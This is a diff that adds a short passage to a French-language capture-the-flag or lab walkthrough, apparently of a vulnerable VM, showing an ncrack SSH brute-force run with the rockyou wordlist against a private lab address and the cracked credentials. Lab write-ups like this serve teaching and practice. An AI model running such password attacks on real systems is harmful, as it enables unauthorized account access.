@@ -313,6 +313,19 @@ Si on se rappelle le message du début, on pouvait lire quelque chose comme
 
 En fait le mot de passe de `theuser` est `different`... Quel humour de merde !
 
+On peut aussi l'avoir via brute-force :
+
+```console
+$ ncrack --user theuser -P rockyou.txt ssh://192.168.56.102
+
+Starting Ncrack 0.8 ( http://ncrack.org ) at 2025-05-19 17:51 CEST
+Stats: 3:54:42 elapsed; 0 services completed (1 total)
+Rate: 5.67; Found: 1; About 0.48% done
+(press 'p' to list discovered credentials)
+Discovered credentials for ssh on 192.168.56.102 22/tcp:
+192.168.56.102 22/tcp ssh: 'theuser' 'different'
+```
+
 ### Dédé
 
 ```console
